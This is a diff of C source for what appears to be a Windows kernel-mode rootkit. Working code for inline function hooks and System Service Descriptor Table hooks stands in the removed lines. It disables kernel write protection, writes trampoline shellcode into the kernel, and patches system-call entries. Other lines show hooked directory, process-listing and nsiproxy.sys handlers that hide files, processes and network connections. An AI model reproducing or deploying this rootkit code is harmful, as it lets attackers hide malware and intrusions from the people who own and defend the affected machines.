@@ -1,4 +1,3 @@
-#include <intrin.h>
 #include "hooking.h"
 #include "HookingGlobals.h"
 #pragma warning(disable : 4996)
@@ -7,112 +6,25 @@
 #pragma warning(disable : 4127)
 
 
-NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
-	// Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
-	// Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
-	PVOID* SaveBuffer = NULL;
-	ULONG64 ReplacementValue = 0;
-	NTSTATUS Status = STATUS_UNSUCCESSFUL;
-	UNICODE_STRING TargetName = { 0 };
-	ANSI_STRING AnsiTargetName = { 0 };
-	PVOID TargetFunction = NULL;
-
-	BYTE ShellCode[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, evilfunction
-									0x41, 0xff, 0xe5 };  // jmp r13 (jump to r13 value - the value of ReplacementFunc)
-						 
-
-	// Check for invalid parameters:
-	if (HookingFunction == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (HookingFunction = NULL)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-
-
-	// Get the address of the target function:
-	if (ModuleName == NULL) {
-		RtlInitAnsiString(&AnsiTargetName, RoutineName);
-		Status = RtlAnsiStringToUnicodeString(&TargetName, &AnsiTargetName, TRUE);
-		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (cannot get RoutineName in UNICODE_STRING format: 0x%x)\n", Status);
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_UNSUCCESSFUL;
-		}
-		TargetFunction = MmGetSystemRoutineAddress(&TargetName);
-		if (TargetFunction == NULL) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Kernel function hook failed (cannot get address of kernel function)\n");
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_INVALID_ADDRESS;
-		}
-	}
-	else {
-		TargetFunction = SystemModuleExportMEM(ModuleName, RoutineName);
-		if (TargetFunction == NULL) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - Driver function hook failed (failed getting the driver function base address)\n");
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_INVALID_ADDRESS;
-		}
-	}
-
-
-	// Save the original sizeof(ShellCode) bytes in buffer for later use in repairing it:	
-	if (ToSave) {
-		switch (Tag) {
-		case 'HkQr': SaveBuffer = &OriginalNtQueryDirFile; break;
-		case 'HkQx': SaveBuffer = &OriginalNtQueryDirFileEx; break;
-		default: return STATUS_INVALID_PARAMETER;
-		}
-		*SaveBuffer = ExAllocatePoolWithTag(NonPagedPool, sizeof(ShellCode), Tag);
-		if (*SaveBuffer == NULL) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook - cannot allocate saving buffer)\n");
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			return STATUS_MEMORY_NOT_ALLOCATED;
-		}
-		if (!WriteToReadOnlyMemoryMEM(*SaveBuffer, TargetFunction, sizeof(ShellCode), FALSE)) {
-			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook)\n");
-			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-			if (*SaveBuffer != NULL) {
-				ExFreePool(*SaveBuffer);
-			}
-			return STATUS_UNSUCCESSFUL;
-		}
-	}
-
-
-	// Prepare the shellcode for deployment and write it into memory:
-	ReplacementValue = (ULONG64)HookingFunction;
-    RtlCopyMemory(&ShellCode[2], &ReplacementValue, sizeof(PVOID));
-	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		if (SaveBuffer != NULL && *SaveBuffer != NULL) {
-			ExFreePool(*SaveBuffer);
-		}
-		return STATUS_UNSUCCESSFUL;
-	}
-	return STATUS_SUCCESS;
-}
-
-
 BOOL roothook::CleanAllHooks() {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
 
 	// Unhook all hooked system services:
+	//roothook::InfinityWrap::ReleaseInfinityHooks();
 	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG))) {
 		return FALSE;
 	}
 	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG))) {
 		return FALSE;
 	}
-	if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_SYSCALL1809))) {
+	if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG))) {
+		return FALSE;
+	}
+
+
+	// Release IRP hook of nsiproxy.sys:
+	if (!NT_SUCCESS(irphooking::ReleaseIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL))) {
 		return FALSE;
 	}
 
@@ -126,240 +38,6 @@ BOOL roothook::CleanAllHooks() {
 		return TRUE;
 	}
 	return FALSE;
-}
-
-
-ULONG roothook::SSDT::GetSystemCallIndex(PUNICODE_STRING SystemServiceName) {
-	PVOID SystemServiceAddress = MmGetSystemRoutineAddress(SystemServiceName);
-	if (SystemServiceAddress == NULL) {
-		return 0;
-	}
-	return (*(PULONG)((PUCHAR)SystemServiceAddress + 1));
-}
-
-
-void roothook::SSDT::EnableWriteProtection(KIRQL CurrentIRQL) {
-	ULONG64 cr0 = __readcr0() | 0x10000;
-	_enable();  // Enable interrupts, mightve interrupted the process
-	__writecr0(cr0);
-	KeLowerIrql(CurrentIRQL);
-}
-
-
-KIRQL roothook::SSDT::DisableWriteProtection() {
-	KIRQL CurrentIRQL = KeRaiseIrqlToDpcLevel();
-	ULONG64 cr0 = __readcr0() & 0xfffffffffffeffff;  // Assumes processor is AMD64
-	__writecr0(cr0);
-	_disable();    // Disable interrupts
-	return CurrentIRQL;
-}
-
-
-ULONG64 roothook::SSDT::CurrentSSDTFuncAddr(ULONG SyscallNumber) {
-	LONG SystemServiceValue = 0;
-	PULONG ServiceTableBase = NULL;
-	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
-	SystemServiceValue = ServiceTableBase[SyscallNumber];
-	SystemServiceValue = SystemServiceValue >> 4;
-	return (ULONG64)SystemServiceValue + (ULONG64)ServiceTableBase;
-}
-
-
-ULONG64 roothook::SSDT::GetServiceDescriptorTable() {
-	ULONG64  KiSystemCall64 = __readmsr(0xC0000082);	// Get the address of nt!KeSystemCall64
-	ULONG64  KiSystemServiceRepeat = 0;
-	INT32 Limit = 4096;
-	for (int i = 0; i < Limit; i++) {
-		if (*(PUINT8)(KiSystemCall64 + i) == 0x4C
-			&& *(PUINT8)(KiSystemCall64 + i + 1) == 0x8D
-			&& *(PUINT8)(KiSystemCall64 + i + 2) == 0x15){
-			KiSystemServiceRepeat = KiSystemCall64 + i;  // Got stub of ServiceDescriptorTable from KiSystemServiceRepeat refrence
-			return (ULONG64)(*(PINT32)(KiSystemServiceRepeat + 3) + KiSystemServiceRepeat + 7);	 // Convert relative address to absolute address
-		}
-	}
-
-	return NULL;
-}
-
-
-ULONG roothook::SSDT::GetOffsetFromSSDTBase(ULONG64 FunctionAddress) {
-	PULONG ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
-	return ((ULONG)(FunctionAddress - (ULONGLONG)ServiceTableBase)) << 4;
-}
-
-
-NTSTATUS roothook::SSDT::SystemServiceDTHook(PVOID HookingFunction, ULONG Tag){
-	/*
-	Business logic of hook:
-	1) Get address of ServiceDescriptorTable with specific pattern matching in the kernel code section (.text)
-	2) Get the address of the current function (will be put in *OriginalFunction) from the SSDT
-	3) Add the address of the hooking function to the data of the trampoline dummy (SSDT entry is only 32 bits in x64, need to create stub hook and kump to that)
-	4) Find an area inside the kernel's code section (.text) that can hold the data of the trampoline dummy hook (check sequence of nops big enough)
-	5) Map the kernel's image into writeable memory, change protection settings to be able to write dummy hook into the kernel, write it into the kernel
-	6) Disable WP (Write-Protected), patch the SSDT entry, enable WP protections
-	7) Unmap the kernel image to save changes
-	*/
-
-
-	BYTE DummyTrampoline[] = { 0x50,  // push rax
-							   0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rax, HookingFunction
-							   0x48, 0x87, 0x04, 0x24,  // xchg QWORD PTR [rsp],rax
-							   0xc3 };  // ret (jmp to HookingFunction)
-	PVOID TrampolineSection = NULL;  // Will hold the matching sequence of nop/int3 instructions for the trampoline hook
-	PVOID KernelMapping = NULL;
-	PVOID* OriginalFunction = NULL;
-	PMDL KernelModuleDescriptor = NULL;
-	PULONG ServiceTableBase = NULL;  // Used to modify the actual entry in the SSDT
-	KIRQL CurrentIRQL = NULL;
-	ULONG SyscallNumber = 0;
-	ULONG SSDTEntryValue = 0;
-
-
-	// Check for invalid parameters:
-	if (HookingFunction == NULL || Tag == 0){  // OriginalFunction == NULL || SyscallNumber == 0) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid parameters: %p, %lu)\n", HookingFunction, Tag);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-
-
-	// Get the original function matching buffer and find the syscall number:
-	switch (Tag) {
-	case NTQUERY_TAG: OriginalFunction = &ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
-	case NTQUERYEX_TAG: OriginalFunction = &ActualNtQueryDirFileEx; SyscallNumber = NTQUERYEX_SYSCALL1809; break;
-	case NTQUERYSYSINFO_TAG: OriginalFunction = &ActualNtQuerySystemInformation; SyscallNumber = NTQUERYSYSINFO_SYSCALL1809; break;
-
-	default:
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook failed (invalid tag: %lu)\n", Tag);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-
-
-	// Make preperations for SSDT hook - get SSDT address, get ntoskrnl.exe image base address and get code section (.text section) address of the kernel:
-	if (KiServiceDescriptorTable == NULL) {
-		KiServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)roothook::SSDT::GetServiceDescriptorTable();
-	}
-	if (KiServiceDescriptorTable == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the service descriptor table base address)\n", SyscallNumber);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_NOT_FOUND;
-	}
-	if (KernelImageBaseAddress == NULL) {
-		KernelImageBaseAddress = memory_helpers::GetModuleBaseAddressADD("\\SystemRoot\\System32\\ntoskrnl.exe");
-	}
-	if (KernelImageBaseAddress == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the kernel image)\n", SyscallNumber);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_NOT_FOUND;
-	}
-	if (KernelTextSection == NULL || TextSectionSize == 0) {
-		KernelTextSection = (BYTE*)memory_helpers::GetTextSectionOfSystemModuleADD(KernelImageBaseAddress, &TextSectionSize);
-	}
-	if (KernelTextSection == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find the base address of the .text section of the kernel)\n", SyscallNumber);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_NOT_FOUND;
-	}
-
-
-	// Get the address of the original function from the SSDT and copy the new function (HookingFunction) to the trampoline hook:
-	*OriginalFunction = (PVOID)roothook::SSDT::CurrentSSDTFuncAddr(SyscallNumber);
-	RtlCopyMemory(&DummyTrampoline[3], &HookingFunction, sizeof(PVOID));
-
-
-	// Find a long enough sequence of nop/int3 instructions in the kernel's .text section to put the trampoline hook in:
-	TrampolineSection = memory_helpers::FindUnusedMemoryADD(KernelTextSection, TextSectionSize, sizeof(DummyTrampoline));
-	if (TrampolineSection == NULL) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot find sequence of %zu bytes that are nop/int3 instructions, %p, %lu)\n", SyscallNumber, sizeof(DummyTrampoline), KernelTextSection, TextSectionSize);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_NOT_FOUND;
-	}
-
-	
-	// Map the kernel into writeable space to be able to put trampoline hook in and modify the SSDT entry:
-	KernelModuleDescriptor = IoAllocateMdl(TrampolineSection, sizeof(DummyTrampoline), 0, 0, NULL);
-	if (KernelModuleDescriptor == NULL){
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot allocate module descriptor to write into the kernel image, %p, %zu)\n", SyscallNumber, TrampolineSection, sizeof(DummyTrampoline));
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_MEMORY_NOT_ALLOCATED;
-	}
-	MmProbeAndLockPages(KernelModuleDescriptor, KernelMode, IoWriteAccess);
-	KernelMapping = MmMapLockedPagesSpecifyCache(KernelModuleDescriptor, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
-	if (KernelMapping == NULL){
-		MmUnlockPages(KernelModuleDescriptor);
-		IoFreeMdl(KernelModuleDescriptor);
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu failed (cannot map the kernel into writeable memory)\n", SyscallNumber);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_UNSUCCESSFUL;
-	}
-
-	
-	// Patch the SSDT entry and write trampoline hook into the kernel:
-	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
-	CurrentIRQL = roothook::SSDT::DisableWriteProtection();  // Disable WP (Write-Protection) to be able to write into the SSDT
-	RtlCopyMemory(KernelMapping, DummyTrampoline, sizeof(DummyTrampoline));  // Copy the trampoline hook in the kernel's memory
-	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)TrampolineSection);
-	SSDTEntryValue = SSDTEntryValue & 0xFFFFFFF0;
-	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;  
-	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
-	roothook::SSDT::EnableWriteProtection(CurrentIRQL);  // Enable WP (Write-Protection) to restore earlier settings
-
-
-	// Unmap the kernel image:
-	MmUnmapLockedPages(KernelMapping, KernelModuleDescriptor);
-	MmUnlockPages(KernelModuleDescriptor);
-	IoFreeMdl(KernelModuleDescriptor);
-	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-	DbgPrintEx(0, 0, "KMDFdriver SSDT hook %lu succeeded\n", SyscallNumber);
-	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-	return STATUS_SUCCESS;
-}
-
-
-NTSTATUS roothook::SSDT::SystemServiceDTUnhook(ULONG Tag) {
-	PULONG ServiceTableBase = NULL;
-	KIRQL CurrentIRQL = NULL;
-	ULONG SSDTEntryValue = NULL;
-	PVOID ActualFunction = NULL;
-	ULONG SyscallNumber = 0;
-
-	if (Tag == 0) {
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid parameter: %lu)\n", Tag);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-	switch (Tag) {
-	case NTQUERY_TAG: ActualFunction = ActualNtQueryDirFile; SyscallNumber = NTQUERY_SYSCALL1809; break;
-	case NTQUERYEX_TAG: ActualFunction = ActualNtQueryDirFileEx;  SyscallNumber = NTQUERYEX_SYSCALL1809;  break;
-	case NTQUERYSYSINFO_TAG: ActualFunction = &ActualNtQuerySystemInformation; SyscallNumber = NTQUERYSYSINFO_SYSCALL1809; break;
-
-	default:
-		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-		DbgPrintEx(0, 0, "KMDFdriver SSDT unhook failed (invalid tag: %lu)\n", Tag);
-		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-		return STATUS_INVALID_PARAMETER;
-	}
-	ServiceTableBase = (PULONG)KiServiceDescriptorTable->ServiceTableBase;
-	CurrentIRQL = roothook::SSDT::DisableWriteProtection();
-	SSDTEntryValue = roothook::SSDT::GetOffsetFromSSDTBase((ULONG64)ActualFunction);
-	SSDTEntryValue &= 0xFFFFFFF0;
-	SSDTEntryValue += ServiceTableBase[SyscallNumber] & 0x0F;
-	ServiceTableBase[SyscallNumber] = SSDTEntryValue;
-	roothook::SSDT::EnableWriteProtection(CurrentIRQL);
-	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
-	DbgPrintEx(0, 0, "KMDFdriver SSDT unhook %lu succeeded\n", SyscallNumber);
-	DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
-	return STATUS_SUCCESS;
 }
 
 
@@ -504,11 +182,11 @@ NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
 
-	case RKOP_HIDEPORT:
+	case RKOP_HIDEADDR:
 
-		// Hide port with IRP hook to nsiproxy.sys:
-		DbgPrintEx(0, 0, "Request Type: hide port connection with IRP hook to IRP_MJ_DEVICE_CONTROL of nsiproxy.sys\n");
-		Return = HidePortConnectionRK(RootkInstructions);
+		// Hide networking connections with IRP hook to nsiproxy.sys:
+		DbgPrintEx(0, 0, "Request Type: hide networking connections with IRP hook to IRP_MJ_DEVICE_CONTROL of nsiproxy.sys\n");
+		Return = HideNetworkConnectionRK(RootkInstructions);
 		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
 		return Return;
 	}
@@ -543,13 +221,12 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	
 
 	// Call the original NtQueryDirectoryFile:
-	OgNtQueryDirectoryFile = (QueryDirFile)ActualNtQueryDirFile;
+	OgNtQueryDirectoryFile = (QueryDirFile)roothook::SSDT::GetOriginalSyscall(NTQUERY_TAG);
 	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
 		return Status;
 	}
-
 
 
 	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
@@ -569,10 +246,9 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 
 	// Search if path starts with "nosusfolder":
 	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
-
-
+	
+	
 	// Filter results by type of information requested (both/bothid = fileexp,full/fullid=dir,cd):
-
 	Status = IterateOverFiles(FileInformationClass, FileInformation, &DirStatus, &IsDirSame, &RequestedDir, &IsSystemRoot,
 		&SusFolder, &QueryUnicode);
 	if (Status == STATUS_INVALID_PARAMETER) {
@@ -609,7 +285,7 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 
 	
 	// Call the original NtQueryDirectoryFile:
-	OgNtQueryDirectoryFileEx = (QueryDirFileEx)ActualNtQueryDirFileEx;
+	OgNtQueryDirectoryFileEx = (QueryDirFileEx)roothook::SSDT::GetOriginalSyscall(NTQUERYEX_TAG);
 	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
 		Length, FileInformationClass, QueryFlags, FileName);
 	if (!NT_SUCCESS(Status) || FileInformation == NULL) {
@@ -646,7 +322,7 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 }
 
 
-NTSTATUS EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
+NTSTATUS roothook::EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	OUT PVOID SystemInformation,
 	IN ULONG SystemInformationLength,
 	OUT PULONG ReturnLength OPTIONAL) {
@@ -658,8 +334,8 @@ NTSTATUS EvilQuerySystemInformation(IN SYSTEM_INFORMATION_CLASS SystemInformatio
 	ULONG ProcessCount = 0;
 	
 
-	// Call the original NtQueryInformationFile:
-	OgNtQuerySystemInformation = (QuerySystemInformation)ActualNtQuerySystemInformation;
+	// Call the original NtQuerySystemInformation:
+	OgNtQuerySystemInformation = (QuerySystemInformation)roothook::SSDT::GetOriginalSyscall(NTQUERYSYSINFO_TAG);
 	Status = OgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 	if (!NT_SUCCESS(Status) || SystemInformation == NULL || SystemInformationClass != SystemProcessInformation) {
 		return Status;
